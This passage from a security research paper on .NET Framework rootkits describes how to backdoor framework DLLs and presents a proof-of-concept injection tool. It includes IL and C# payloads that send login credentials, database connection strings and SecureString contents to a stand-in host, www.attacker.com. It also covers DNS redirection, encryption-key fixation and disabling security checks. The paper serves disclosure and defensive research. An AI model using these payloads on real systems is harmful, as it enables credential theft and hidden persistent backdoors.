method Run(Form mainForm) which is executed each time a new application is 
created. 
Adding code that calls our ReverseShell function: 
Note that this is a "pre injection" technique, in which our code is injected at the 
beginning of the original method code. 
Injected
 Original code
 Modified code (pre injection)
 .NET Framework Rootkits – Backdoors Inside Your Framework
22
DNS record fixation  
All DNS queries perform (directly or indirectly) in the .NET Framework are handled 
by the Dns class, using the GetHostAddresses method for instance. This class is 
located in System.dll. 
In this example, let's modify this method and fixate the IP address returned to be the 
attacker's Man-In-the-Middle IP address. 
We can easily accomplish it by just pre-injecting the following 2 lines of code into the 
beginning of GetHostAddresses: 
IL_0000: ldstr "www.attacker.com" 
IL_0005: starg.s hostNameOrAddress 
This example will always return the query result for www.attacker.com, ignoring the 
requested hostname. 
This example can be extended to perform any DNS manipulation the attacker wishes. 
Stealing the connection string for every connection opening 
The class SqlConnection is responsible for opening the connection to the DB. This 
class is located inside System.Data.dll and contains an method called Open() which is 
responsible for opening a connection as specified in the connectionString class 
member  variable. 
We can modify the behavior of Open() to send the connection string to the attacker 
each time it is called. 
So Open() can be changed so that a call to SendToUrl is placed at the beginning of 
this method (pre injection), sending the value of this.ConnectionString to the attacker 
collector page. 
C# representation of the modified Open() function will be: 
public override void Open() 
{ 
SendToUrl(“www.attacker.com”, this.ConnectionString); 
… 
… 
} 
Injecting Browser exploitation framework into auto generated HTML/JS files 
The Framework contains many pieces of HTML / Javascript code that is used by aspx 
pages as code templates. Those pieces of code are contained as imbedded resources 
inside the Framework DLL's. 
For example, System.Web.dll contains lots of JS files that we can tamper with. It is 
possible to inject persistent javascript code into the templates (similar to the concept 
of persistent XSS). 
A very interesting attack would be to inject a call to some XSS framework, such as  
XSS shell: 
 .NET Framework Rootkits – Backdoors Inside Your Framework
23
Now we can "own" the clients browsers for every page they visit.. ☺ 
Encryption key fixation / stealing /downgrading / etc.. 
Example is a very interesting attack vector against .NET cryptography at mscorlib.dll 
(System.Security.Cryptography). 
Since it is possible to change the code, we can apply the following attacks: 
 Key fixation can cause the encryption methods to always use the same key, 
giving a false sense of security to the user who thinks the encryption is 
performed using his chosen key. 
 Key stealing can be achieved by sending encryption keys to the attacker 
(using SendToUrl, for example) 
 Key/algorithm downgrading can be achieved by setting the least secure 
algorithm as the default for encryption (for example, setting the default 
symmetric algorithm to DES instead of the default AES.. ☺) 
And of course, those are just simple examples… 
Let's take a look for Rijndael key fixation. The following is the C# implementation of 
GenerateKey(): 
public override void GenerateKey() 
{ 
    base.KeyValue = new byte[base.KeySizeValue / 8]; 
    Utils.StaticRandomNumberGenerator.GetBytes(base.KeyValue); 
} 
As can be seen, this method generates a byte array for KeyValue and calls the RNG 
that fills it with random bytes. 
Removing the RNG code and replacing it with some constant assignment for 
KeyValue will leaves us with a fixed value for the key. 
The simplest fixation can be achieved using a zero key by omitting the random 
number generation line and use the fact that byte arrays are initialized with zeroes: 
public override void GenerateKey() 
{ 
    base.KeyValue = new byte[base.KeySizeValue / 8]; 
} 
From the innocent user point of view, his data is encrypted. The only difference is that 
it's not his key… 
Securestring stealing 
SecureString is a special string protected with encryption by the .NET Framework. It 
is implemented as part of System.Security at mscorlib.dll 
Since it is a special string for protecting data otherwise stored as a regular string, it 
probably contains valuable data. 
 .NET Framework Rootkits – Backdoors Inside Your Framework
24
It would be interesting to inject code that will send this data to the attacker, using 
SendToUrl for example. An interesting location would be to inject it into the 
Dispose() method of SecureString. 
Injected code (C# representation): 
IntPtr ptr = 
System.Runtime.InteropServices.Marshal.SecureStringToBSTR(secureString); 
SendToUrl(“www.attacker.com”, 
       System.Runtime.InteropServices.Marshal.PtrToStringBSTR(ptr)); 
Disabling security checks  
Messing around with CAS (Code Access Security) can be achieved by modifying the 
behavior of important classes from System.Security, System.Security.Permissions, 
etc.. 
It is possible to disable security checks by changing the logic of 
 CodeAccessPermission::Demand() 
 CodeAccessPermission::Deny() 
 CodeAccessPermission::Assert() 
 FileIOPermission, RegistryPermission, etc. 
Using this technique, it is possible to backdoor security checks for specific users, 
specified DLL's, etc. 
 .NET Framework Rootkits – Backdoors Inside Your Framework
25
Automating the process with .NET-Sploit 
During this research, it was clear that a specified tool is needed which can help with 
automating the process described above. 
.NET-Sploit [8] is a generic Framework modification tool developed as PoC for the 
techniques described in this paper that aide the process of injecting / modifying .NET 
assemblies. 
.NET-Sploit is able to: 
 Modify a given function 
 Inject payloads  
 Execute payloads 
 Takes care of “code reshaping” 
 Pull the relevant DLL from the GAC 
 Generate a deployer for the modified DLL 
.NET-Sploit is inspired from H.D. Moore’s amazing “metasploit” [9] exploit 
platform.  
Its specialty is the abstraction from which code injection is composed, and the 
separation of the following building blocks: 
 Function – a new method to extend a specified DLL 
 Payload – code that is injected into specific method 
 Reference – reference to other DLL (if necessary) 
 Item – XML based composition the above building blocks 
 .NET Framework Rootkits – Backdoors Inside Your Framework
26
.NET-Sploit lets you develop functions and payload regardless of the way in which 
they'll be used by using the pre-defined "building blocks". It is the purpose of an item 
to declare a specific injection that combines the generic payload and functions. 
Example #1 – printing every string twice: 
Implementing it requires adding the same code to the WriteLine method, as the 
payload.  
Therefore, we need a payload file (WriteLine_Twice.payload) such as: 
    IL_0000:  call       class System.IO.TextWriter System.Console::get_Out() 
    IL_0005:  ldarg.0 
    IL_0006:  callvirt   instance void System.IO.TextWriter::WriteLine(string) 
    IL_000b:  ret 
This payload needs to be injected into WriteLine, so we need to look for the method 
signature (declaration): 
.method public hidebysig static void  WriteLine(string 'value') cil managed 
The following item file (WriteLine_Twice.item) contains the information required to 
make this injection: 
     The specified code will change WriteLine(string s) in such a way that each time it is called the     
                           string s will be printed twice 
     mscorlib.dll   
     c:\WINDOWS\assembly\GAC_32\mscorlib\2.0.0.0__b77a5c561934e089 
     c:\WINDOWS\assembly\NativeImages_v2.0.50727_32\mscorlib 
        writeline_twice.payload 
        8 
We have here: 
• The description 
• The name of target assembly (mscorlib.dll) 
• The location in the GAC and native image 
• The payload details ("AssemblyCode"): 
o Name of payload file (writeline_twice.payload) 
o Method signature to search and inject into 
o Stacksize – 8 (same as in original method)  
 .NET Framework Rootkits – Backdoors Inside Your Framework
27
Example #2 – sending authentication details to the attacker: 
The following is an example for an item that defines a modification for 
Authenticate(string username,string password). 
We need a payload file(call_steal_password.payload): 
IL_0000:  ldstr      "http://www.attacker.com/CookieStealer/WebForm1.aspx\?s="   
IL_0005:  ldarg.0 
IL_0006:  ldstr      ":" 
IL_000b:  ldarg.1 
IL_000c:  call       string [mscorlib]System.String::Concat(string, string,string) 
IL_0011:  call void System.Web.Security.FormsAuthentication::SendToUrl(string,    
                                                                                                                           string) 
IL_0016:  ret 
Our payload is using the new SendToUrl method, so we need a function file for it, 
saved in "SendToUrl_generic.func" 
This payload needs to be injected into Authenticate, so we need to look for the 
method signature (declaration): 
.method public hidebysig static bool  Authenticate(string name, 
The following item file (steal_authentication_credentials.item) contains the 
information required to make this injection: 
     The specified code will change the method "Authenticate(string username,string password)" in   
             such a way that each time it is called the username+password will be send to the attacker  
             collector page at http://www.attacker.com/CookieStealer/WebForm1.aspx 
     System.Web.dll 
     c:\WINDOWS\assembly\GAC_32\System.Web\2.0.0.0__b03f5f7f11d50a3a 
     c:\WINDOWS\assembly\NativeImages_v2.0.50727_32\System.Web 
        SendToUrl_generic.func 
        FALSE 
        call_steal_password.payload 
        8 
 .NET Framework Rootkits – Backdoors Inside Your Framework
28
We have here: 
• The description 
• The name of target assembly (mscorlib.dll) 
• The location in the GAC and native image 
• The function details ("AssemblyFunc"): 
o Name of function file (SendToUrl_generic.func) 
o Location of injection to search for 
o Boolean value to declare whether to inject before or after the location 
• The payload details ("AssemblyCode"): 
o Name of payload file (writeline_twice.payload) 
o Method signature to search and inject into 
o Stacksize – 8 (same as in original method)  
For more information about .NET-Sploit, download of the tool and source code 
please refer to  
http://www.applicationsecurity.co.il/.NET-Framework-Rootkits.aspx 
 .NET Framework Rootkits – Backdoors Inside Your Framework
29
Other platforms relevancy – Java Rootkits 
Although the focus of this paper is the .NET Framework, the techniques described 
here had been is not restricted to .NET. 
The same techniques were applied to Java's JVM, while extracting the java classes 
located in the JRE library directory (for example, in c:\Program Files\Java\jre6\lib). 
Here, you can find the java classes runtime classes stored in jar files. Using the same 
techniques, it is possible to extract the jar classes (for example, from rt.jar), modify 
the class byte code, repackage it and save it back into the library directory. 
As an example, below you can find the decompiled code (using DJ Decompiler) of 
the java class   com.sun.security.auth.module.Crypt, providing password encryption 
routine that can easily be tampered using the same techniques described in this paper 
 .NET Framework Rootkits – Backdoors Inside Your Framework
30
Conclusions 
Modification of the framework behavior can lead to some very interesting results as 
seen in this paper. An attacker who has managed to compromise your machine can 
backdoor your framework, leaving rootkits behind without any traces. Those rootkits 
can turn the framework upside down, letting the attacker do everything he wants 
while his malicious code is hidden deep inside the framework DLL’s. 
As the owner of the machine, there’s not much you can do about that – in case the 
attacker had already "rooted" your machine. You can use external file tampering 
detectors, such as tripwire, in a scenario where you have another machine that 
monitors your machine. Microsoft, as the developer of the Framework, should give 
the .NET Framework a kernel level modification protection. Microsoft response team 
assigned the GAC protection bypass case the track number of "MSRC 8566gs", but 
even if the GAC bypass will be fixed it'll surely be possible to mount the attacks 
described in this paper in some other way, since an attacker who has administrator 
level privileges on a machine can do everything anyway. 
An to the brighter side of the story… although this concept can be used maliciously, it 
can still be used positively to make custom “MOD” frameworks for topics such as 
performance, bug fixing, and more ☺ 
About 
Erez Metula (PI:EMAIL) is a senior application security consultant & 
trainer, working as the application security department manager at 2BSecure. 
 .NET Framework Rootkits – Backdoors Inside Your Framework
31
References  
[1] Common Language Runtime (CLR), Microsoft 
http://msdn.microsoft.com/en-us/library/8bs2ecf4(VS.80).aspx 
[2] Common Language Infrastructure (CLI), Standard ECMA-335 
http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-335.pdf 
[3].NET reverse engineering, Erez Metula 
http://download.microsoft.com/download/7/7/b/77b7a327-8b92-4356-bb18-
bc01e09abef3/m5p.pdf 
[4] FileMon, Mark Russinovich and Bryce Cogswell 
http://technet.microsoft.com/en-us/sysinternals/bb896642.aspx 
[5] .NET Reflector, Lutz Roeder 
http://www.red-gate.com/products/reflector/ 
[6] NGen Revs Up Your Performance with Powerful New Features, Microsoft 
http://msdn.microsoft.com/en-us/magazine/cc163808.aspx 
[7] drop-and-pop, ha.cked,net 
http://ha.cked.net/dropandpop.zip 
[8] .NET-Sploit, Erez Metula 
http://www.applicationsecurity.co.il/.NET-Framework-Rootkits.aspx 
[9] Metasploit project, H D Moore 
www.metasploit.com/